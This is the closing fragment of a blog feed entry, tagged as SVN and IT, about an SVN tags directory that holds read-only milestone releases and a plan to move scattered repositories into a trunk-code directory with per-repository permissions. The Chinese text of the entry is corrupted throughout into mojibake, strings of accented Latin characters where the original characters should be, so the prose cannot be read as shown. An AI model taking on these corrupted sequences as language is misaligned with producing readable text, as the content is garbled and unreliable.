<p><strong>tags</strong>ç›®å½•ä¸€èˆ¬æ˜¯åªè¯»çš„ï¼Œè¿™é‡Œå­˜å‚¨é˜¶æ®µæ€§çš„å‘å¸ƒç‰ˆæœ¬ï¼Œåªæ˜¯ä½œä¸ºä¸€ä¸ªé‡Œç¨‹ç¢‘çš„ç‰ˆæœ¬è¿›è¡Œå­˜æ¡£ã€‚    </p>
<p>ç°åœ¨éœ€è¦å°†åˆ†æ•£çš„ä»£ç ä»“åº“éƒ½è¿ç§»æ”¾åˆ° <em>trunk-code</em> ç›®å½•ä¸‹è¿›è¡Œåˆ†ç±»å­˜æ”¾, å¹¶è§„åˆ’ç›¸åº”ä»“åº“çš„äººå‘˜æƒé™</p>]]>
    
    </summary>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
</feed>
